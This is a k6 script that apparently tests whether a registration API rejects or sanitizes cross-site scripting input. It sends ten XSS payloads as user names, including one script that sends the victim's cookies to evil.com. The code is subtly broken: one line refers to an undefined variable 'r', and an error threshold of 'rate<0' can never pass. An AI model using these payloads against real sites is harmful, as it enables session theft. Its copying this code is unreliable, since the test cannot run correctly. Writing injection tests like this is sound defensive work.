import http from 'k6/http';
import { check } from 'k6';
import { Rate } from 'k6/metrics';

const errorRate = new Rate('errors');
const BASE_URL = __ENV.BASE_URL || 'http://localhost:8000';

const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><script>alert(1)</script>',
  'javascript:alert(1)',
  '{{constructor.constructor("alert(1)")()}}',
  '"><svg onload=alert(1)>',
  "'-alert(1)-'",
  '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>',
  '<body onload=alert(1)>',
  '"><img src=x onerror=alert(1)>',
];

export const options = {
  vus: 1,
  iterations: xssPayloads.length,
  thresholds: {
    errors: ['rate<0'],
  },
};

export default function () {
  const payload = xssPayloads[(__ITER) % xssPayloads.length];

  const res = http.post(`${BASE_URL}/api/v1/auth/register`, {
    name: payload,
    email: `xss${__ITER}@test.com`,
    password: 'Password1!',
    password_confirmation: 'Password1!',
    phone_number: '+27720000000',
  });

  check(res, {
    [`XSS payload rejected or sanitized (iter ${__ITER})`]: (r) =>
      r.status !== 500 && !r.body.includes('alert(1)'),
  });

  errorRate.add(
    res.status === 500 || r.body.includes('<script>'),
  );
}
